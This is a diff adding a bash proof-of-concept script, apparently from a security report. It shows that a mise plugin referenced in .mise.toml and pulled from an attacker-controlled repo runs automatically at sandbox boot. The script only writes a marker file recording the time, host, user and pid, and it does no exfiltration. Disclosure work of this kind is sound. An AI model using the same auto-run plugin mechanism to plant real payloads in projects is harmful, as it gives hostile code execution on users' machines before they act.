@@ -1,0 +1,43 @@
+#!/bin/bash
+# Benign POC: proves .mise.toml plugin executes on sandbox boot
+# NO exfiltration, NO C2, NO credential access
+# Just creates a visible marker file
+
+echo "=== MISE PLUGIN EXECUTED ==="
+echo "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+echo "hostname: $(hostname)"
+echo "user: $(whoami)"
+echo "pid: $$"
+
+PROJDIR="/workspaces/default/code"
+[ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
+PUB="$PROJDIR/public"
+mkdir -p "$PUB" 2>/dev/null
+
+cat > "$PUB/mise-plugin-poc.txt" << EOF
+===================================================
+  .mise.toml Plugin Execution Proof
+===================================================
+
+This file was created automatically by a custom
+mise plugin during sandbox initialization.
+
+Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)
+Hostname:  $(hostname)
+User:      $(whoami)
+PID:       $$
+
+This proves that:
+  1. .mise.toml in the project root defines plugins
+  2. Plugins are cloned from attacker-controlled GitHub repos
+  3. bin/install runs automatically as user 'foundry'
+  4. The plugin has full filesystem access
+
+If this file exists, arbitrary code execution occurred
+during sandbox boot — before the user interacted with
+the project at all.
+===================================================
+EOF
+
+echo "Marker written to: $PUB/mise-plugin-poc.txt"
+echo "=== POC COMPLETE ==="
